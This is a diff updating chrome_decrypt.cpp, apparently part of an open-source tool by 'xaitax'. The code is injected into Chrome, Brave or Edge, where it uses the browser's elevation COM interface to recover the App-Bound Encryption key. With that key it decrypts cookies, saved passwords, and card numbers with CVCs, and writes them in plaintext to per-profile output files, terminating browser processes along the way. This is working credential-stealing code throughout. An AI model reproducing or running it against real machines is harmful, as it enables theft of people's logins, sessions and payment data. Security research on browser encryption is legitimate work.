@@ -1,5 +1,5 @@
 // chrome_decrypt.cpp
-// v0.8.0 (c) Alexander 'xaitax' Hagenah
+// v0.9.0 (c) Alexander 'xaitax' Hagenah
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 /*
  * Chrome App-Bound Encryption Service:
@@ -25,6 +25,7 @@
 #include <cctype>
 
 const WCHAR *COMPLETION_EVENT_NAME_DLL = L"Global\\ChromeDecryptWorkDoneEvent";
+const char *SESSION_CONFIG_FILE_NAME = "chrome_decrypt_session.cfg";
 
 #include "sqlite3.h"
 
@@ -145,24 +146,29 @@ public:
 };
 
 MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
-IEdgeIntermediateElevator : public IEdgeElevatorBase_Placeholder 
+IEdgeIntermediateElevator : public IEdgeElevatorBase_Placeholder
 {
 public:
     virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
-        const WCHAR *crx_path, const WCHAR *browser_appid, const WCHAR *browser_version,
-        const WCHAR *session_id, DWORD caller_proc_id, ULONG_PTR *proc_handle) = 0;
+        const WCHAR *crx_path, 
+        const WCHAR *browser_appid, 
+        const WCHAR *browser_version,
+        const WCHAR *session_id, 
+        DWORD caller_proc_id, 
+        ULONG_PTR *proc_handle) = 0;
     virtual HRESULT STDMETHODCALLTYPE EncryptData(
-        ProtectionLevel protection_level, const BSTR plaintext,
-        BSTR *ciphertext, DWORD *last_error) = 0;
+        ProtectionLevel protection_level, 
+        const BSTR plaintext,
+        BSTR *ciphertext, 
+        DWORD *last_error) = 0;
     virtual HRESULT STDMETHODCALLTYPE DecryptData(
-        const BSTR ciphertext, BSTR *plaintext, DWORD *last_error) = 0;
+        const BSTR ciphertext, 
+        BSTR *plaintext,
+        DWORD *last_error) = 0;
 };
 
 MIDL_INTERFACE("C9C2B807-7731-4F34-81B7-44FF7779522B")
-IEdgeElevatorFinal : public IEdgeIntermediateElevator
-{
-};
-
+IEdgeElevatorFinal : public IEdgeIntermediateElevator{};
 
 namespace ChromeAppBound
 {
@@ -198,11 +204,11 @@ namespace ChromeAppBound
     {
         CLSID clsid;
         IID iid;
-        fs::path executablePath;
-        fs::path localStateSubPath;
-        fs::path cookieSubPath;
-        fs::path loginDataSubPath;
-        fs::path webDataSubPath;
+        fs::path userDataRootSubPath;
+        fs::path localStateFileName;
+        fs::path cookieDbRelativePath;
+        fs::path loginDataDbRelativePath;
+        fs::path webDataDbRelativePath;
         std::string name;
     };
 
@@ -215,14 +221,12 @@ namespace ChromeAppBound
             CoTaskMemFree(path_known_folder);
             return result;
         }
-
         char path_legacy[MAX_PATH];
         if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path_legacy) == S_OK)
         {
             Logging::Log("[!] SHGetKnownFolderPath failed, using SHGetFolderPathA fallback for LocalAppData.");
             return fs::path(path_legacy);
         }
-
         Logging::Log("[-] CRITICAL: Failed to get Local AppData path.");
         throw std::runtime_error("Failed to get Local AppData path.");
     }
@@ -230,43 +234,9 @@ namespace ChromeAppBound
     const std::unordered_map<std::string, BrowserConfig> &GetBrowserConfigs()
     {
         static const std::unordered_map<std::string, BrowserConfig> browser_configs_map = {
-            {
-                "chrome", {
-                    {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}},
-                    {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}},
-                    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
-                    fs::path("Google") / "Chrome" / "User Data" / "Local State",
-                    fs::path("Google") / "Chrome" / "User Data" / "Default" / "Network" / "Cookies",
-                    fs::path("Google") / "Chrome" / "User Data" / "Default" / "Login Data",
-                    fs::path("Google") / "Chrome" / "User Data" / "Default" / "Web Data",
-                    "Chrome"
-                }
-            },
-            {
-                "brave", {
-                    {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}},
-                    {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}},
-                    "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
-                    fs::path("BraveSoftware") / "Brave-Browser" / "User Data" / "Local State",
-                    fs::path("BraveSoftware") / "Brave-Browser" / "User Data" / "Default" / "Network" / "Cookies",
-                    fs::path("BraveSoftware") / "Brave-Browser" / "User Data" / "Default" / "Login Data",
-                    fs::path("BraveSoftware") / "Brave-Browser" / "User Data" / "Default" / "Web Data",
-                    "Brave"
-                }
-            },
-            {
-                "edge", {
-                    {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}},
-                    {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}},
-                    "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
-                    fs::path("Microsoft") / "Edge" / "User Data" / "Local State",
-                    fs::path("Microsoft") / "Edge" / "User Data" / "Default" / "Network" / "Cookies",
-                    fs::path("Microsoft") / "Edge" / "User Data" / "Default" / "Login Data",
-                    fs::path("Microsoft") / "Edge" / "User Data" / "Default" / "Web Data",
-                    "Edge"
-                }
-            }
-        };
+            {"chrome", {{0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}, {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}, fs::path("Google") / "Chrome" / "User Data", "Local State", fs::path("Network") / "Cookies", "Login Data", "Web Data", "Chrome"}},
+            {"brave", {{0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}}, {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}}, fs::path("BraveSoftware") / "Brave-Browser" / "User Data", "Local State", fs::path("Network") / "Cookies", "Login Data", "Web Data", "Brave"}},
+            {"edge", {{0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}}, {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}}, fs::path("Microsoft") / "Edge" / "User Data", "Local State", fs::path("Network") / "Cookies", "Login Data", "Web Data", "Edge"}}};
         return browser_configs_map;
     }
 
@@ -281,6 +251,7 @@ namespace ChromeAppBound
         Logging::Log("[-] Unsupported browser type requested: " + browserType);
         throw std::invalid_argument("Unsupported browser type: " + browserType);
     }
+
     std::string BytesToHexString(const BYTE *byteArray, size_t size)
     {
         std::ostringstream oss;
@@ -291,15 +262,16 @@ namespace ChromeAppBound
         }
         return oss.str();
     }
+
     std::string BytesToHexString(const std::vector<uint8_t> &bytes)
     {
         return BytesToHexString(bytes.data(), bytes.size());
     }
+
     std::optional<std::vector<uint8_t>> Base64DecodeApi(const std::string &base64String)
     {
         if (base64String.empty())
         {
-            Logging::Log("[+] Base64 input is empty, decoded to empty.");
             return std::vector<uint8_t>();
         }
 
@@ -312,7 +284,6 @@ namespace ChromeAppBound
 
         if (decodedSize == 0)
         {
-            Logging::Log("[+] Base64 decoded to zero bytes (API).");
             return std::vector<uint8_t>();
         }
 
@@ -322,28 +293,17 @@ namespace ChromeAppBound
             Logging::Log("[-] CryptStringToBinaryA (decode) failed. Error: " + std::to_string(GetLastError()));
             return std::nullopt;
         }
-        Logging::Log("[+] Finished Base64 decoding with API (" + std::to_string(decodedData.size()) + " bytes).");
         return decodedData;
     }
-    std::optional<std::vector<uint8_t>> RetrieveEncryptedKeyFromLocalState(const fs::path &localStateSubPath)
+
+    std::optional<std::vector<uint8_t>> RetrieveEncryptedKeyFromLocalState(const fs::path &localStateFullPath)
     {
-        fs::path fullPath;
-        try
-        {
-            fullPath = GetLocalAppDataPath() / localStateSubPath;
-        }
-        catch (const std::runtime_error &e)
-        {
-            Logging::Log("[-] Error getting full Local State path: " + std::string(e.what()));
-            return std::nullopt;
-        }
+        Logging::Log("[+] Attempting to read Local State file: " + localStateFullPath.u8string());
 
-        Logging::Log("[+] Attempting to read Local State path: " + fullPath.string());
-
-        std::ifstream f(fullPath, std::ios::binary);
+        std::ifstream f(localStateFullPath, std::ios::binary);
         if (!f)
         {
-            Logging::Log("[-] Cannot open Local State file: " + fullPath.string());
+            Logging::Log("[-] Cannot open Local State file: " + localStateFullPath.u8string());
             return std::nullopt;
         }
 
@@ -395,6 +355,7 @@ namespace ChromeAppBound
         Logging::Log("[+] Encrypted key header is valid.");
         return std::vector<uint8_t>(decodedData.begin() + sizeof(KEY_PREFIX), decodedData.end());
     }
+
     fs::path GetTempKeyFilePath()
     {
         try
@@ -407,6 +368,7 @@ namespace ChromeAppBound
             return fs::path("chrome_appbound_key.txt");
         }
     }
+
     void SaveKeyToFile(const std::string &keyHex)
     {
         auto path = GetTempKeyFilePath();
@@ -414,13 +376,14 @@ namespace ChromeAppBound
         if (f)
         {
             f << keyHex;
-            Logging::Log("[+] Decrypted AES key (hex) saved to: " + path.string());
+            Logging::Log("[+] Decrypted AES key (hex) saved to: " + path.u8string());
         }
         else
         {
-            Logging::Log("[-] Failed to save decrypted key to file: " + path.string());
+            Logging::Log("[-] Failed to save decrypted key to file: " + path.u8string());
         }
     }
+
     void KillBrowserProcesses(const std::string &browserType)
     {
         std::wstring procNameW;
@@ -459,22 +422,23 @@ namespace ChromeAppBound
                     {
                         if (TerminateProcess(hProcess, 0))
                         {
-                            // Logging::Log("[+] Terminated process: ID " + std::to_string(pe.th32ProcessID) + " (" + WCharArrToString(pe.szExeFile) + ")");
+                            Logging::Log("[+] Terminated process: ID " + std::to_string(pe.th32ProcessID) + " (" + WCharArrToString(pe.szExeFile) + ")");
                         }
                         else
                         {
-                            Logging::Log("[-] Failed to terminate process ID " + std::to_string(pe.th32ProcessID) + " (" + WCharArrToString(pe.szExeFile) + "). Error: " + std::to_string(GetLastError()));
+                            // Logging::Log("[-] Failed to terminate process ID " + std::to_string(pe.th32ProcessID) + " (" + WCharArrToString(pe.szExeFile) + "). Error: " + std::to_string(GetLastError()));
                         }
                         CloseHandle(hProcess);
                     }
                     else
                     {
-                        Logging::Log("[-] Failed to open process ID " + std::to_string(pe.th32ProcessID) + " (" + WCharArrToString(pe.szExeFile) + ") for termination. Error: " + std::to_string(GetLastError()));
+                        // Logging::Log("[-] Failed to open process ID " + std::to_string(pe.th32ProcessID) + " (" + WCharArrToString(pe.szExeFile) + ") for termination. Error: " + std::to_string(GetLastError()));
                     }
                 }
             } while (Process32NextW(snap, &pe));
         }
     }
+
     static std::string escapeJson(const std::string &s)
     {
         std::string out;
@@ -519,6 +483,7 @@ namespace ChromeAppBound
         }
         return out;
     }
+
     std::optional<std::vector<uint8_t>> DecryptGcm(
         const std::vector<uint8_t> &key,
         const uint8_t *iv, ULONG ivLen,
@@ -591,35 +556,57 @@ namespace ChromeAppBound
         return plain;
     }
 
-    fs::path GetCookiesOutputPath(const std::string &browserName)
+    fs::path GetOutputFilePath(const fs::path &baseOutputPath, const std::string &browserName, const std::string &profileName, const std::string &dataType)
     {
-        try
-        {
-            return fs::temp_directory_path() / (browserName + "_decrypt_cookies.txt");
-        }
-        catch (const fs::filesystem_error &e)
-        {
-            Logging::Log("[!] Filesystem error getting temp path for cookies output: " + std::string(e.what()) + ". Using current directory.");
-            return fs::path(browserName + "_decrypt_cookies.txt");
-        }
-    }
-    void DecryptCookies(const std::vector<uint8_t> &aesKey, const BrowserConfig &cfg)
-    {
-        fs::path dbPath;
-        try
-        {
-            dbPath = GetLocalAppDataPath() / cfg.cookieSubPath;
-        }
-        catch (const std::runtime_error &e)
-        {
-            Logging::Log("[-] Error getting full Cookies DB path: " + std::string(e.what()));
-            return;
-        }
+        fs::path profileSpecificDir = baseOutputPath / browserName / profileName;
+        std::error_code ec;
 
-        sqlite3 *raw_conn = nullptr;
-        if (sqlite3_open_v2(dbPath.string().c_str(), &raw_conn, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK)
+        auto check_and_create = [&](const fs::path &dir_to_create) -> bool
         {
-            Logging::Log("[-] sqlite3_open_v2 failed for Cookies DB (" + dbPath.string() + "): " + (raw_conn ? sqlite3_errmsg(raw_conn) : "Unknown error before connection assignment"));
+            if (!fs::exists(dir_to_create))
+            {
+                if (!fs::create_directories(dir_to_create, ec))
+                {
+                    Logging::Log("[-] Failed to create directory: " + dir_to_create.u8string() + ". Error: " + ec.message());
+                    return false;
+                }
+                Logging::Log("[+] Created directory: " + dir_to_create.u8string());
+            }
+            return true;
+        };
+
+        if (!check_and_create(profileSpecificDir))
+        {
+            profileSpecificDir = baseOutputPath / browserName;
+            if (!check_and_create(profileSpecificDir))
+            {
+                profileSpecificDir = baseOutputPath;
+                if (!check_and_create(profileSpecificDir))
+                {
+                    Logging::Log("[!] All output directory creation attempts failed. Falling back to temp directory for " + dataType);
+                    try
+                    {
+                        return fs::temp_directory_path() / (browserName + "_" + profileName + "_" + dataType + ".txt");
+                    }
+                    catch (const fs::filesystem_error &e_temp)
+                    {
+                        Logging::Log("[!] Filesystem error getting temp path for output: " + std::string(e_temp.what()) + ". Using current directory for " + dataType);
+                        return fs::path(browserName + "_" + profileName + "_" + dataType + ".txt");
+                    }
+                }
+            }
+        }
+        return profileSpecificDir / (dataType + ".txt");
+    }
+
+    void DecryptCookies(const std::vector<uint8_t> &aesKey,
+                        const fs::path &cookieDbPath,
+                        const fs::path &outFilePath)
+    {
+        sqlite3 *raw_conn = nullptr;
+        if (sqlite3_open_v2(cookieDbPath.string().c_str(), &raw_conn, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK)
+        {
+            Logging::Log("[-] sqlite3_open_v2 failed for Cookies DB (" + cookieDbPath.u8string() + "): " + (raw_conn ? sqlite3_errmsg(raw_conn) : "Unknown error before connection assignment"));
             if (raw_conn)
                 sqlite3_close_v2(raw_conn);
             return;
@@ -627,20 +614,18 @@ namespace ChromeAppBound
         SqliteDbPtr conn(raw_conn);
 
         sqlite3_stmt *raw_stmt = nullptr;
-        const char *sql_query = "SELECT host_key,name,encrypted_value FROM cookies;";
-        int rc_prepare = sqlite3_prepare_v2(conn.get(), sql_query, -1, &raw_stmt, nullptr);
-        if (rc_prepare != SQLITE_OK)
+        const char *sql_query = "SELECT host_key, name, encrypted_value FROM cookies;";
+        if (sqlite3_prepare_v2(conn.get(), sql_query, -1, &raw_stmt, nullptr) != SQLITE_OK)
         {
             Logging::Log("[-] sqlite3_prepare_v2 failed for Cookies query: " + std::string(sqlite3_errmsg(conn.get())));
             return;
         }
         SqliteStmtPtr stmt(raw_stmt);
 
-        fs::path outFilePath = GetCookiesOutputPath(cfg.name);
         std::ofstream out(outFilePath, std::ios::trunc);
         if (!out)
         {
-            Logging::Log("[-] Could not open cookies output file: " + outFilePath.string());
+            Logging::Log("[-] Could not open cookies output file: " + outFilePath.u8string());
             return;
         }
 
@@ -680,19 +665,11 @@ namespace ChromeAppBound
                             << "}";
                         extracted_count++;
                     }
-                    else
-                    {
-                        // Logging::Log("[-] Decrypted cookie for " + std::string(host ? host : "<null_host>") + "/" + std::string(name ? name : "<null_name>") + " has size " + std::to_string(optPlain->size()) + ", not > offset " + std::to_string(DECRYPTED_COOKIE_VALUE_OFFSET));
-                    }
                 }
                 else
                 {
-                    Logging::Log("[-] Cookie decryption failed for " + std::string(host ? host : "<null_host>") + "/" + std::string(name ? name : "<null_name>"));
+                    // Logging::Log("[-] Cookie decryption failed for " + std::string(host ? host : "<null_host>") + "/" + std::string(name ? name : "<null_name>"));
                 }
-            }
-            else if (blob)
-            {
-                Logging::Log("[-] Skipped cookie entry for " + std::string(host ? host : "<null_host>") + "/" + std::string(name ? name : "<null_name>") + ": Prefix mismatch/small. Len: " + std::to_string(blob_len));
             }
         }
         if (rc_step != SQLITE_DONE)
@@ -701,39 +678,21 @@ namespace ChromeAppBound
         }
 
         out << "\n]\n";
-        Logging::Log("[*] " + std::to_string(extracted_count) + " Cookies extracted to " + outFilePath.string());
-    }
-
-    fs::path GetPasswordsOutputPath(const std::string &browserName)
-    {
-        try
+        if (extracted_count > 0)
         {
-            return fs::temp_directory_path() / (browserName + "_decrypt_passwords.txt");
-        }
-        catch (const fs::filesystem_error &e)
-        {
-            Logging::Log("[!] Filesystem error getting temp path for passwords output: " + std::string(e.what()) + ". Using current directory.");
-            return fs::path(browserName + "_decrypt_passwords.txt");
+            Logging::Log("     [*] " + std::to_string(extracted_count) + " Cookies extracted to " + outFilePath.u8string());
         }
     }
-    void DecryptPasswords(const std::vector<uint8_t> &aesKey, const BrowserConfig &cfg)
-    {
-        fs::path dbPath;
-        try
-        {
-            dbPath = GetLocalAppDataPath() / cfg.loginDataSubPath;
-        }
-        catch (const std::runtime_error &e)
-        {
-            Logging::Log("[-] Error getting full Login Data DB path: " + std::string(e.what()));
-            return;
-        }
 
-        std::string db_uri = "file:" + dbPath.string() + "?mode=ro&nolock=1";
+    void DecryptPasswords(const std::vector<uint8_t> &aesKey,
+                          const fs::path &loginDbPath,
+                          const fs::path &outFilePath)
+    {
+        std::string db_uri = "file:" + loginDbPath.string() + "?mode=ro&nolock=1";
         sqlite3 *raw_conn = nullptr;
         if (sqlite3_open_v2(db_uri.c_str(), &raw_conn, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK)
         {
-            Logging::Log("[-] sqlite3_open_v2 failed (Login Data URI - " + dbPath.string() + "): " + (raw_conn ? sqlite3_errmsg(raw_conn) : "nolock open URI failed"));
+            Logging::Log("[-] sqlite3_open_v2 failed (Login Data URI - " + loginDbPath.u8string() + "): " + (raw_conn ? sqlite3_errmsg(raw_conn) : "nolock open URI failed"));
             if (raw_conn)
                 sqlite3_close_v2(raw_conn);
             return;
@@ -749,11 +708,10 @@ namespace ChromeAppBound
         }
         SqliteStmtPtr stmt(raw_stmt);
 
-        fs::path outFilePath = GetPasswordsOutputPath(cfg.name);
         std::ofstream out(outFilePath, std::ios::trunc);
         if (!out)
         {
-            Logging::Log("[-] Could not open passwords output file: " + outFilePath.string());
+            Logging::Log("[-] Could not open passwords output file: " + outFilePath.u8string());
             return;
         }
 
@@ -777,7 +735,6 @@ namespace ChromeAppBound
                 const uint8_t *ct_ptr = blob + V20_PREFIX.length() + GCM_IV_LENGTH;
 
                 auto optPlain = DecryptGcm(aesKey, iv_ptr, (ULONG)GCM_IV_LENGTH, ct_ptr, ct_len, tag_ptr, (ULONG)GCM_TAG_LENGTH);
-
                 if (optPlain)
                 {
                     if (!optPlain->empty())
@@ -793,19 +750,11 @@ namespace ChromeAppBound
                             << "}";
                         extracted_count++;
                     }
-                    else
-                    {
-                        Logging::Log("[-] Decrypted password is empty for " + std::string(origin ? origin : "<null_origin>"));
-                    }
                 }
                 else
                 {
-                    Logging::Log("[-] Password decryption failed for " + std::string(origin ? origin : "<null_origin>"));
+                    // Logging::Log("[-] Password decryption failed for " + std::string(origin ? origin : "<null_origin>"));
                 }
-            }
-            else if (blob)
-            {
-                Logging::Log("[-] Skipped password entry for " + std::string(origin ? origin : "<null_origin>") + ": Prefix mismatch/small. Len: " + std::to_string(blob_len));
             }
         }
         if (rc_step != SQLITE_DONE)
@@ -814,39 +763,21 @@ namespace ChromeAppBound
         }
 
         out << "\n]\n";
-        Logging::Log("[*] " + std::to_string(extracted_count) + " Passwords extracted to " + outFilePath.string());
-    }
-    fs::path GetPaymentsOutputPath(const std::string &browserName)
-    {
-        try
+        if (extracted_count > 0)
         {
-            return fs::temp_directory_path() / (browserName + "_decrypt_payments.txt");
-        }
-        catch (const fs::filesystem_error &e)
-        {
-            Logging::Log("[!] Filesystem error getting temp path for payments output: " + std::string(e.what()) + ". Using current directory.");
-            return fs::path(browserName + "_decrypt_payments.txt");
+            Logging::Log("     [*] " + std::to_string(extracted_count) + " Passwords extracted to " + outFilePath.u8string());
         }
     }
-    void DecryptPaymentMethods(const std::vector<uint8_t> &aesKey, const BrowserConfig &cfg)
+
+    void DecryptPaymentMethods(const std::vector<uint8_t> &aesKey,
+                               const fs::path &webDataDbPath,
+                               const fs::path &outFilePath)
     {
-        fs::path filePath;
-        try
-        {
-            filePath = GetLocalAppDataPath() / cfg.webDataSubPath;
-        }
-        catch (const std::runtime_error &e)
-        {
-            Logging::Log("[-] Error getting full Web Data DB path: " + std::string(e.what()));
-            return;
-        }
-
-        std::string db_uri = "file:" + filePath.string() + "?mode=ro&nolock=1";
-
+        std::string db_uri = "file:" + webDataDbPath.string() + "?mode=ro&nolock=1";
         sqlite3 *raw_conn = nullptr;
         if (sqlite3_open_v2(db_uri.c_str(), &raw_conn, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK)
         {
-            Logging::Log("[-] sqlite3_open_v2 failed (Web Data URI - " + filePath.string() + "): " + (raw_conn ? sqlite3_errmsg(raw_conn) : "nolock open URI failed"));
+            Logging::Log("[-] sqlite3_open_v2 failed (Web Data URI - " + webDataDbPath.u8string() + "): " + (raw_conn ? sqlite3_errmsg(raw_conn) : "nolock open URI failed"));
             if (raw_conn)
                 sqlite3_close_v2(raw_conn);
             return;
@@ -894,11 +825,10 @@ namespace ChromeAppBound
         }
         SqliteStmtPtr stmt_cc(raw_stmt_cc);
 
-        fs::path outFilePath = GetPaymentsOutputPath(cfg.name);
         std::ofstream out(outFilePath, std::ios::trunc);
         if (!out)
         {
-            Logging::Log("[-] Could not open payments output file: " + outFilePath.string());
+            Logging::Log("[-] Could not open payments output file: " + outFilePath.u8string());
             return;
         }
         out << "[\n";
@@ -933,18 +863,6 @@ namespace ChromeAppBound
                 {
                     card_number_str.assign(reinterpret_cast<const char *>(optPlainNum->data()), optPlainNum->size());
                 }
-                else if (optPlainNum)
-                {
-                    Logging::Log("[-] Decrypted card number is empty for guid " + guid);
-                }
-                else
-                {
-                    Logging::Log("[-] Card number decryption failed for guid " + guid);
-                }
-            }
-            else if (cc_blob)
-            {
-                Logging::Log("[-] Skipped card number for guid " + guid + ": Prefix mismatch/small. Len: " + std::to_string(cc_blob_len));
             }
 
             std::string cvc_value_str;
@@ -965,18 +883,6 @@ namespace ChromeAppBound
                     {
                         cvc_value_str.assign(reinterpret_cast<const char *>(optPlainCvc->data()), optPlainCvc->size());
                     }
-                    else if (optPlainCvc)
-                    {
-                        Logging::Log("[-] Decrypted CVC is empty for guid " + guid);
-                    }
-                    else
-                    {
-                        Logging::Log("[-] CVC decryption failed for guid " + guid);
-                    }
-                }
-                else if (!cvc_blob_vec.empty())
-                {
-                    Logging::Log("[-] Skipped CVC for guid " + guid + ": Prefix mismatch/small. Len: " + std::to_string(cvc_blob_vec.size()));
                 }
             }
 
@@ -998,7 +904,10 @@ namespace ChromeAppBound
         }
 
         out << "\n]\n";
-        Logging::Log("[*] " + std::to_string(extracted_count) + " Payment methods extracted to " + outFilePath.string());
+        if (extracted_count > 0)
+        {
+            Logging::Log("     [*] " + std::to_string(extracted_count) + " Payment methods extracted to " + outFilePath.u8string());
+        }
     }
 }
 
@@ -1011,7 +920,6 @@ DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
 {
     ThreadParams *params = static_cast<ThreadParams *>(lpParam);
     HMODULE hModule_dll_copy = params ? params->hModule_dll : NULL;
-    std::string browserType_worker;
 
     if (params)
     {
@@ -1019,8 +927,51 @@ DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
         params = nullptr;
     }
 
-    Logging::Log("", true);
+    fs::path finalOutputPath;
+    try
+    {
+        fs::path configFilePathDll = fs::temp_directory_path() / SESSION_CONFIG_FILE_NAME;
+        std::ifstream configFileDll(configFilePathDll);
+        if (configFileDll)
+        {
+            std::string outputPathStr((std::istreambuf_iterator<char>(configFileDll)), std::istreambuf_iterator<char>());
+            finalOutputPath = outputPathStr;
+            configFileDll.close();
+            std::error_code ec_remove_cfg;
+            fs::remove(configFilePathDll, ec_remove_cfg);
+            // Logging::Log("[+] Loaded output path from session config: " + finalOutputPath.u8string());
+        }
+        else
+        {
+            Logging::Log("[-] Session config file not found or unreadable: " + configFilePathDll.u8string() + ". Using default output path.");
+            finalOutputPath = fs::current_path() / "output_dll_default";
+        }
+    }
+    catch (const std::exception &e)
+    {
+        Logging::Log("[-] Exception reading session config: " + std::string(e.what()) + ". Using default output path.");
+        finalOutputPath = fs::current_path() / "output_dll_default_exc";
+    }
+    std::error_code ec_base_output;
+    if (!fs::exists(finalOutputPath))
+    {
+        if (!fs::create_directories(finalOutputPath, ec_base_output))
+        {
+            Logging::Log("[-] Failed to create base output directory: " + finalOutputPath.u8string() + ". Error: " + ec_base_output.message());
+            try
+            {
+                finalOutputPath = fs::temp_directory_path() / "chrome_decrypt_fallback_output";
+            }
+            catch (...)
+            {
+                finalOutputPath = "chrome_decrypt_very_fallback_output";
+            }
+            Logging::Log("[!] Using fallback output directory: " + finalOutputPath.u8string());
+            fs::create_directories(finalOutputPath, ec_base_output);
+        }
+    }
 
+    std::string browserType_worker;
     char rawExePath[MAX_PATH] = {0};
     if (GetModuleFileNameA(NULL, rawExePath, MAX_PATH) == 0)
     {
@@ -1029,7 +980,6 @@ DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
             FreeLibraryAndExitThread(hModule_dll_copy, 1);
         return 1;
     }
-
     fs::path currentProcessPath(rawExePath);
     std::string currentProcessName = currentProcessPath.filename().string();
     std::transform(currentProcessName.begin(), currentProcessName.end(), currentProcessName.begin(),
@@ -1059,7 +1009,6 @@ DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
         return 1;
     }
     Logging::Log("[+] COM library initialized (APARTMENTTHREADED).");
-
     struct ComInitializerGuard
     {
         ~ComInitializerGuard()
@@ -1082,66 +1031,20 @@ DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
         return 1;
     }
 
-    HRESULT hr_create = E_FAIL;
-    HRESULT hr_proxy = E_FAIL;
-    HRESULT hr_decrypt = E_FAIL;
-    BSTR bstrPlainKey = nullptr;
-    DWORD lastComError = 0;
-
-    Microsoft::WRL::ComPtr<IOriginalBaseElevator> chromeBraveElevator;
-    Microsoft::WRL::ComPtr<IEdgeElevatorFinal> edgeElevator;
-
-    if (browserType_worker == "edge") {
-        hr_create = CoCreateInstance(cfg.clsid, nullptr, CLSCTX_LOCAL_SERVER, 
-                                    cfg.iid,
-                                    &edgeElevator);
-        if (SUCCEEDED(hr_create)) {
-            Logging::Log("[+] IElevator instance created for Edge.");
-            hr_proxy = CoSetProxyBlanket(
-                edgeElevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,
-                RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
-        }
-    } else {
-        hr_create = CoCreateInstance(cfg.clsid, nullptr, CLSCTX_LOCAL_SERVER, 
-                                    cfg.iid,
-                                    &chromeBraveElevator);
-        if (SUCCEEDED(hr_create)) {
-            Logging::Log("[+] IElevator instance created for " + cfg.name + ".");
-            hr_proxy = CoSetProxyBlanket(
-                chromeBraveElevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,
-                RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
-        }
-    }
-
-    if (FAILED(hr_create)) {
-        std::ostringstream err;
-        err << "[-] CoCreateInstance for specified IElevator interface failed: 0x" << std::hex << hr_create;
-        Logging::Log(err.str());
-        if (hr_create == REGDB_E_CLASSNOTREG)
-            Logging::Log("    Details: Class not registered for " + cfg.name + " with IID: " + ChromeAppBound::WCharArrToString(reinterpret_cast<const WCHAR*>(&cfg.iid)) + ".");
-        else if (hr_create == E_NOINTERFACE)
-            Logging::Log("    Details: E_NOINTERFACE. The COM object does not support the requested interface IID: " + ChromeAppBound::WCharArrToString(reinterpret_cast<const WCHAR*>(&cfg.iid)) + ".");
-        else if (hr_create == E_ACCESSDENIED)
-            Logging::Log("    Details: Access denied.");
-        else if (hr_create == CO_E_SERVER_EXEC_FAILURE)
-            Logging::Log("    Details: Server execution failure.");
-        if (hModule_dll_copy)
-            FreeLibraryAndExitThread(hModule_dll_copy, 1);
-        return 1;
-    }
-
-    if (FAILED(hr_proxy))
+    fs::path localStateFullPath;
+    try
     {
-        std::ostringstream errProxy;
-        errProxy << "[-] CoSetProxyBlanket failed. HRESULT: 0x" << std::hex << hr_proxy;
-        Logging::Log(errProxy.str());
+        localStateFullPath = ChromeAppBound::GetLocalAppDataPath() / cfg.userDataRootSubPath / cfg.localStateFileName;
+    }
+    catch (const std::runtime_error &e)
+    {
+        Logging::Log("[-] Failed to construct Local State full path: " + std::string(e.what()));
         if (hModule_dll_copy)
             FreeLibraryAndExitThread(hModule_dll_copy, 1);
         return 1;
     }
-    Logging::Log("[+] Proxy blanket set (PKT_PRIVACY, IMPERSONATE, DYNAMIC_CLOAKING).");
 
-    auto optEncKey = ChromeAppBound::RetrieveEncryptedKeyFromLocalState(cfg.localStateSubPath);
+    auto optEncKey = ChromeAppBound::RetrieveEncryptedKeyFromLocalState(localStateFullPath);
     if (!optEncKey)
     {
         Logging::Log("[-] Failed to retrieve encrypted key from Local State.");
